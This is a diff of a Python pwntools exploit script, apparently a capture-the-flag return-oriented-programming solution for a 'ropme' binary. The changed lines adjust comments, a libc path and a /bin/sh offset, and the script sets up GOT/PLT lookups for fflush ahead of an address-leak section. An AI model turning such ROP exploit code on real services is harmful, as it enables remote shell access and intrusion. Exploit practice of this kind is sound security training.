@@ -1,7 +1,7 @@
 from pwn import *
 from sys import argv,exit
 
-
+##### Janky command line parsing ##########
 if len(sys.argv) < 2:
     print("usage: python ropper.py [local|remote ip port]")
     sys.exit(0)
@@ -21,7 +21,7 @@ elif sys.argv[1].lower() == 'remote':
         sys.exit(0)
     if sys.argv[2].lower() not in ('localhost','127.0.0.1'):
         REMOTE = True
-        libc = ELF('/tmp/out/lib/x86_64-linux-gnu/libc.so.6',False) # Not the right libc...but it has the correct offsets except /bin/sh
+        libc = ELF('/root/Desktop/libs/custom_downloaded/libc6_2.23-0ubuntu10_amd64/libc.so.6',False) # Not the right libc...but it has the correct offsets except /bin/sh
     else:
         REMOTE = False
         libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',False)
@@ -31,8 +31,10 @@ elif sys.argv[1].lower()=='local':
     libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',False)
 else:
     print("usage: python ropper.py [remote|local]")
-    sys.exit(0)    
-
+    sys.exit(0)
+    
+    
+###### Make sure this 'solution' is empty when we append ###########
 with open ('/root/Desktop/ropme_solution','w') as f:
     pass
 
@@ -51,7 +53,7 @@ flush_got = e.got.fflush
 flush_plt = e.plt.fflush
 maincall = e.symbols.main
 
-bin_sh = 0x18cd17 # offset for actual libc
+bin_sh = 0x18cd17 # offset for actual libc - my remote libc is wrong by 0x40 for some reason
 
 
 ############ Leak addresses #############
